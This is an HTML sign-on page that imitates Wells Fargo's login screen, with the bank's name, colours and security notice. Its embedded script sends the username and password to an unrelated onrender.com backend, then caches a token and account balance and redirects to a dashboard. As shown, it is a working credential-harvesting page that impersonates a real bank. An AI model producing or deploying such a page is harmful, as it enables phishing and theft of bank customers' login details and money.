<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Wells Fargo - Sign On</title>
  <link rel="icon" href="logo.png" />
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
    }

    header {
      background-color: #002878;
      color: white;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 16px;
    }

    header img {
      height: 35px;
    }

    header .right-nav {
      display: flex;
      align-items: center;
      gap: 15px;
      font-size: 14px;
    }

    .container {
      max-width: 400px;
      margin: 40px auto;
      background: white;
      border-radius: 8px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    .tabs {
      display: flex;
      border-bottom: 1px solid #ccc;
    }

    .tabs div {
      flex: 1;
      text-align: center;
      padding: 12px;
      font-weight: bold;
      cursor: pointer;
    }

    .tabs .active {
      border-bottom: 3px solid #d41a1a;
      color: #d41a1a;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-top: 8px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
    }

    label {
      display: block;
      font-size: 14px;
      margin-top: 10px;
    }

    .checkbox-label {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 14px;
      margin-bottom: 20px;
    }

    .forgot-link {
      float: right;
      font-size: 14px;
      color: #004481;
      text-decoration: none;
    }

    .forgot-link:hover {
      text-decoration: underline;
    }

    button {
      background-color: #d41a1a;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      font-size: 16px;
      border-radius: 4px;
      cursor: pointer;
    }

    button:hover {
      background-color: #b01616;
    }

    .bottom-links {
      margin-top: 20px;
      font-size: 14px;
      text-align: center;
    }

    .bottom-links a {
      color: #004481;
      text-decoration: none;
    }

    .bottom-links a:hover {
      text-decoration: underline;
    }

    .security-box {
      margin-top: 30px;
      background-color: #f9f9f9;
      padding: 15px;
      border-left: 4px solid red;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <header>
    <img src="logo.png" alt="Wells Fargo Logo" />
    <div class="right-nav">
      <span>ðŸ‘¤</span>
      <a href="#" style="color:white; text-decoration:none;">Locations</a>
      <a href="#" style="color:white; text-decoration:none;">Spanish</a>
    </div>
  </header>

  <div class="container">
    <div class="tabs">
      <div class="active">Sign On</div>
      <div><a href="#" style="text-decoration:none; color:#000;">Enrollment</a></div>
    </div>

    <form id="login-form">
      <label>Username</label>
      <input type="email" id="email" placeholder="Username or email" required />
      
      <label>
        Password
        <a href="#" class="forgot-link">Forgot password?</a>
      </label>
      <input type="password" id="password" placeholder="Password" required />

      <div class="checkbox-label">
        <input type="checkbox" id="save-username" />
        <label for="save-username">Save username</label>
      </div>

      <button type="submit">Sign In</button>
    </form>

    <div class="bottom-links">
      <p>Don't have username and password? <a href="#">Enroll now</a></p>
      <p>Need assistance? <a href="#">Get help signing in</a></p>
    </div>

    <div class="security-box">
      <strong>Security Center</strong>
      <ul>
        <li>Never share your password, account or personal information.</li>
      </ul>
    </div>
  </div>

  <script>
    const BASE_URL = 'https://backend15-nnmy.onrender.com';

    document.getElementById('login-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      try {
        const res = await fetch(`${BASE_URL}/api/auth/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password })
        });

        const data = await res.json();
        if (res.ok && data.token) {
          localStorage.setItem('userToken', data.token);
          localStorage.setItem('userName', data.name);
          localStorage.setItem('userEmail', data.email);
          localStorage.setItem('userBalance', data.balance);
          window.location.href = 'dashboard.html';
        } else {
          alert(data.message || 'Login failed.');
        }
      } catch (err) {
        alert('Network error. Please try again.');
      }
    });
  </script>
</body>
</html>
